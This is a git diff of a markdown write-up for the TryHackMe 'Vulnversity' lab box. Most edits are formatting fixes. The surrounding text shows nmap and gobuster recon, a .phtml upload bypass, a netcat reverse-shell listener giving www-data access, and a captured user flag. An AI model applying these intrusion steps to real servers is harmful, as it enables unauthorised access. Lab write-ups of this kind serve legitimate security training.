@@ -1,13 +1,18 @@
-This is my writeup for the Try_Hack_Me box - Vulnversity
-The box showcases web exploiation and set uid priv escalation.
+# This is my writeup for the Try_Hack_Me box - Vulnversity
+
+The box showcases web exploitation and set uid priv escalation.\
+The box is now taken of the website. But still worth it.
  
 > Pratyush Prakhar (5h1NcH@n010) - 11/01/2020
 
-# RECONNAISSANCE
 
-2. Scan the box, how many ports are open?- **6**
+## RECONNAISSANCE
+
+1. Scan the box, how many ports are open?- **6**
 	
 	1. Ran a quick scan for all ports
+
+	**Output**
 
 	```bash
 	sudo nmap -p- -vv 10.10.237.128
@@ -28,6 +33,8 @@ The box showcases web exploiation and set uid priv escalation.
 	```
 
 	2. Then ran a standard scan for the specific ports found - **21,22,139,445,3128,3333**
+
+	**Output**
 
 	```bash
 	sudo nmap -vv -sC -sV -p21,22,139,445,3128,3333 10.10.237.128
@@ -134,7 +141,7 @@ The box showcases web exploiation and set uid priv escalation.
 	7. What port is the web server running on? - Service running on Apache Web Server - **3333**
 
 
-# GOBUSTER
+## GOBUSTER
 	
 2. What is the directory that has an upload form page? - **/internal/** - Upload
 
@@ -167,7 +174,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-# Web Exploit
+## Web Exploit
 
 **Images**
 
@@ -176,6 +183,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 3. What extension is allowed? - **.phtml**
 
 4. Stabilizing shell
+
+**Output**
 
 ```bash
 kali@kali:~/Desktop/Try_Hack_Me/Vulnversity$ nc -lnvvp 8888
@@ -213,8 +222,7 @@ www-data@vulnuniversity:/home/bill$ cat user.txt
 8bd7992fbe8a6ad22a63361004cfcedb
 ```
 
-# Privilege Escalation
-
+## Privilege Escalation
 
 **LINPEAS OUTPUT**
 ```bash
